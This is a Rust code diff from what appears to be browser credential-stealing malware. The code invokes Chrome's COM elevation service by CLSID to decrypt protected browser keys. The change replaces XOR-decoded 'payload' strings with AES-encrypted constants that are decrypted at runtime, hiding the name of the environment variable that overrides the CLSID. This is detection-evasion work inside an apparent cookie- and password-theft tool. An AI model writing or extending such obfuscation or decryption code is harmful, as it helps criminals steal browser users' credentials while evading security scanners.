@@ -2,13 +2,7 @@
 #![allow(non_snake_case, non_camel_case_types, dead_code, unused)]
 
 use std::ffi::c_void;
-use crate::xor::decode as obf_decode;
-
-mod payload_hex_strings {
-    include!(concat!(env!("OUT_DIR"), "/payload_hex_strings.rs"));
-}
-
-use payload_hex_strings::CHROME_CLSID_ENV as CHROME_RECOVERY_CLSID;
+use crate::xor::{aes_str, CHROME_CLSID_ENV_KEY, CHROME_CLSID_ENV_NONCE, CHROME_CLSID_ENV_CT};
 
 #[repr(C)]
 #[derive(Clone, Copy, Debug)]
@@ -452,7 +446,8 @@ unsafe fn try_one(clsid: &GUID, iid: &GUID, enc: &[u8], slots: &[usize]) -> Resu
 }
 
 unsafe fn try_browser(browser: &BrowserCom, enc: &[u8]) -> Result<Vec<u8>, String> {
-    let clsid = if let Ok(s) = std::env::var(&obf_decode(CHROME_RECOVERY_CLSID)) {
+    let clsid_env_name = aes_str(CHROME_CLSID_ENV_CT, &CHROME_CLSID_ENV_KEY, &CHROME_CLSID_ENV_NONCE);
+    let clsid = if let Ok(s) = std::env::var(&clsid_env_name) {
         if let Some(g) = parse_guid(&s) { g } else { browser.clsid }
     } else {
         browser.clsid
